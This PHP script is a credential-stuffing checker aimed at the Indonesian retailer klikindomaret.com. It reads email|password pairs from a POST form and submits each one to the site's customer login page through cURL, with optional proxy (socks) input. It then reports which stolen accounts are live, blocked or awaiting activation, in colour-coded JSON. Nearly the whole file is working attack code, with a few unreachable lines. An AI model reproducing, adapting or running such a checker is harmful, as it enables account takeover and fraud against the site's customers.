<?php
session_start();
error_reporting(0); 
?>
<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
date_default_timezone_set("Asia/Jakarta");
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'includes/class_curl.php';
if (isset($format)){
	
	// cek wrong
	if ($pisah[1] == '' || $pisah[1] == null) {
		die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
	}
	
    $curl = new curl();
    $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
    $curl->ssl(0, 2);
    $curl->timeout(30);
    $url = "https://www.klikindomaret.com/customer/login";

	$page = $curl->get($url);

	if ($page) {
		 $now = '<font color=yellow>[ACC:Klikindomaret.com]</font> - <font color=lime>'.$_SERVER['HTTP_HOST'].'</font> at </font><font color=lime> '.date("g:i a - F j, Y").'</font>';
		$data = "*ReturnURL=&CustomerLoginModel.Email={$pisah[0]}&CustomerLoginModel.Password={$pisah[1]}";
		$page = $curl->post($url, $data);

		if (inStr($page, "*Email/Nomor Ponsel atau Kata Sandi salah")) {
			die('{"error":2,"msg":"'.$pisah[0].' | '.$pisah[1].'"}');

		die('{"error":0,"msg":"<font color=lime>LIVE |</font> '.$pisah[0].' | '.$pisah[1].' || '.$now.'"}');
		} else if (inStr($page, "Aktivasi")) {
			die('{"error":0,"msg":"'.$pisah[0].' | '.$pisah[1].' |  <font color=blue>[Aktivasi]</font>"}');
		$curl->close();	
		} else if (inStr($page, "Akun Anda telah diblokir. ")) {
			die('{"error":2,"msg":"'.$pisah[0].' | '.$pisah[1].' | <font color=red>[Akun di blokir]</font>"}');
		} else if (inStr($page, "Keluar")) {
			die('{"error":0,"msg":"'.$pisah[0].' | '.$pisah[1].' | '.$now.'"}');
		} else {
			die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		}
	} else {
		die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].' | Unable To Connect "}');
	}
}
?>